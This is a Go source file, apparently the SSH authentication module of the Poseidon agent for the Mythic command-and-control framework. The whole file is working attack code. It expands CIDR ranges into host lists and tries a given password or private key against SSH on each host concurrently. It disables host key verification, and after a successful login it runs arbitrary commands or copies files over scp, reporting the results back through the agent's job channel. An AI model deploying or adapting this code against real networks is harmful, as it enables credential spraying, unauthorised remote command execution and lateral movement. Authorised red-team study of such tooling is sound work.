package sshauth

import (
	"encoding/json"
	"fmt"
	"os"
	"strings"
	"sync"
	"time"

	// External
	"golang.org/x/crypto/ssh"
	// 3rd Party
	"github.com/tmc/scp"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/portscan"
)

// Credential Manages credential objects for authentication
type Credential struct {
	Username   string
	Password   string
	PrivateKey string
}

type ExplicitCred struct {
	Account    string `json:"account"`
	Realm      string `json:"realm"`
	Credential string `json:"credential"`
}

type SSHTestParams struct {
	Hosts       []string      `json:"hosts"`
	Port        int           `json:"port"`
	Username    string        `json:"username"`
	Password    string        `json:"password"`
	Cred        *ExplicitCred `json:"cred,omitempty"`
	PrivateKey  string        `json:"private_key"`
	Command     string        `json:"command"`
	Source      string        `json:"source"`
	Destination string        `json:"destination"`
}

type SSHResult struct {
	Status     string `json:"status"`
	Success    bool   `json:"success"`
	Username   string `json:"username"`
	Secret     string `json:"secret"`
	Output     string `json:"output"`
	Host       string `json:"host"`
	CopyStatus string `json:"copy_status"`
}

// SSH Functions
func PublicKeyFileOrContent(input string) (ssh.AuthMethod, error) {
	var key []byte
	var err error

	if strings.HasPrefix(input, "-----BEGIN") {
		key = []byte(input)
	} else {
		key, err = os.ReadFile(input) // Treat input as a file path
		if err != nil {
			return nil, err
		}
	}
	parsedKey, err := ssh.ParsePrivateKey(key)
	if err != nil {
		return nil, err
	}
	return ssh.PublicKeys(parsedKey), nil
}

func SSHLogin(host string, port int, cred Credential, debug bool, command string, source string, destination string, sshResultChan chan SSHResult) {
	res := SSHResult{
		Host:     host,
		Username: cred.Username,
		Success:  true,
	}
	var sshConfig *ssh.ClientConfig
	if cred.PrivateKey != "" {
		sshAuthMethodPrivateKey, err := PublicKeyFileOrContent(cred.PrivateKey)
		if err != nil {
			res.Success = false
			res.Status = err.Error()
			sshResultChan <- res
			return
		}
		sshConfig = &ssh.ClientConfig{
			User:            cred.Username,
			Timeout:         500 * time.Millisecond,
			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
			Auth:            []ssh.AuthMethod{sshAuthMethodPrivateKey},
		}
	} else {
		sshConfig = &ssh.ClientConfig{
			User:            cred.Username,
			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
			Timeout:         500 * time.Millisecond,
			Auth:            []ssh.AuthMethod{ssh.Password(cred.Password)},
		}
	}

	connectionStr := fmt.Sprintf("%s:%d", host, port)
	connection, err := ssh.Dial("tcp", connectionStr, sshConfig)
	if err != nil {
		if debug {
			errStr := fmt.Sprintf("[DEBUG] Failed to dial: %s", err)
			fmt.Println(errStr)
		}
		res.Success = false
		res.Status = err.Error()
		sshResultChan <- res
		return
	}
	defer connection.Close()

	session, err := connection.NewSession()
	defer session.Close()
	if err != nil {
		res.Success = false
		res.Status = err.Error()
		sshResultChan <- res
		return
	}
	if source != "" && destination != "" {
		err = scp.CopyPath(source, destination, session)
		if err != nil {
			res.Success = false
			res.Status = err.Error()
			res.CopyStatus = "Failed to copy: " + err.Error()
			sshResultChan <- res
			return
		}
		res.CopyStatus = "Successfully copied"
		sshResultChan <- res
		return
	}
	if command != "" {
		modes := ssh.TerminalModes{
			ssh.ECHO:          0, //disable echoing
			ssh.TTY_OP_ISPEED: 14400,
			ssh.TTY_OP_OSPEED: 14400,
		}
		err = session.RequestPty("xterm", 80, 40, modes)
		if err != nil {
			res.Success = false
			res.Status = err.Error()
			res.Output = "Failed to request PTY"
			sshResultChan <- res
			return
		}
		//log.Printf("waiting for output from command after successful auth\n")
		output, err := session.Output(command)
		if err != nil {
			res.Success = false
			res.Status = err.Error()
		} else {
			res.Output = string(output)
		}
		//log.Printf("got output from command")
	} else {
		res.Output = ""
	}
	sshResultChan <- res
	//log.Printf("sent output from session")
	return
}

func SSHBruteHost(host string, port int, creds []Credential, debug bool, command string, source string, destination string, sshResultChan chan SSHResult) {
	for i := 0; i < len(creds); i++ {
		SSHLogin(host, port, creds[i], debug, command, source, destination, sshResultChan)
	}
}

func SSHBruteForce(hosts []string, port int, creds []Credential, debug bool, command string, source string, destination string, job *structs.Job) []SSHResult {
	throttleRoutines := 10
	throttler := make(chan bool, throttleRoutines)
	wg := sync.WaitGroup{}
	sshResultChan := make(chan SSHResult, len(hosts))
	var successfulHosts []SSHResult
	for i := 0; i < len(hosts); i++ {
		//log.Printf("starting loop for host: %s\n", hosts[i])
		throttler <- true // blocking call if we're full
		if *job.Stop > 0 {
			break
		}
		wg.Add(1)
		go func() {
			defer func() {
				//log.Printf("finished scanning: %s\n", hosts[i])
				wg.Done()
				<-throttler // when we're done, take one off the queue so somebody else can run
			}()
			if *job.Stop > 0 {
				return
			}
			//log.Printf("starting to scan: %s\n", hosts[i])
			SSHBruteHost(hosts[i], port, creds, debug, command, source, destination, sshResultChan)
		}()
	}
	//log.Printf("waiting for all scans to finish\n")
	wg.Wait()
	for {
		select {
		case res := <-sshResultChan:
			//log.Printf("got result of scan for: %s\n", res.Host)
			successfulHosts = append(successfulHosts, res)
		case <-time.After(time.Second * 2):
			//log.Printf("breaking after time\n")
			return successfulHosts
		}
	}
}

func Run(task structs.Task) {

	params := SSHTestParams{}
	msg := task.NewResponse()

	// log.Println("Task params:", string(task.Params))
	err := json.Unmarshal([]byte(task.Params), &params)
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	// log.Println("Parsed task params!")
	if len(params.Hosts) == 0 {
		msg.UserOutput = "Missing host(s) parameter."
		msg.Completed = true
		msg.Status = "error"
		task.Job.SendResponses <- msg
		return
	}

	if params.Password == "" && params.PrivateKey == "" && params.Cred == nil {
		msg.UserOutput = "Missing password parameter"
		msg.Completed = true
		msg.Status = "error"
		task.Job.SendResponses <- msg
		return
	}

	if params.Username == "" {
		msg.UserOutput = "Missing username parameter."
		msg.Completed = true
		msg.Status = "error"
		task.Job.SendResponses <- msg
		return
	}

	var totalHosts []string
	for i := 0; i < len(params.Hosts); i++ {
		newCidr, err := portscan.NewCIDR(params.Hosts[i])
		if err != nil {
			//log.Println(err)
			continue
		}
		// Iterate through every host in hostCidr
		for j := 0; j < len(newCidr.Hosts); j++ {
			totalHosts = append(totalHosts, newCidr.Hosts[j].PrettyName)
		}
	}

	if params.Port <= 0 {
		params.Port = 22
	}

	// Handle Cred vs PrivateKey
	var cred Credential
	if params.Cred != nil { // use Cred if provided
		cred = Credential{
			Username:   params.Username,
			Password:   params.Password,
			PrivateKey: params.Cred.Credential,
		}
	} else { // use PrivateKey if provided
		cred = Credential{
			Username:   params.Username,
			Password:   params.Password,
			PrivateKey: params.PrivateKey,
		}
	}

	// log.Println("Beginning brute force...")
	results := SSHBruteForce(totalHosts, params.Port, []Credential{cred}, false, params.Command, params.Source, params.Destination, task.Job)
	// log.Println("Finished!")
	if len(results) > 0 {
		data, err := json.MarshalIndent(results, "", "    ")
		// // fmt.Println("Data:", string(data))
		if err != nil {
			msg.SetError(err.Error())
			task.Job.SendResponses <- msg
			return
		}
		// fmt.Println("Sending on up the data:\n", string(data))
		msg.UserOutput = string(data)
		msg.Completed = true
		task.Job.SendResponses <- msg
		return
	} else {
		// log.Println("No successful auths.")
		msg.UserOutput = "No successful authentication attempts"
		msg.Completed = true
		task.Job.SendResponses <- msg
		return
	}
}
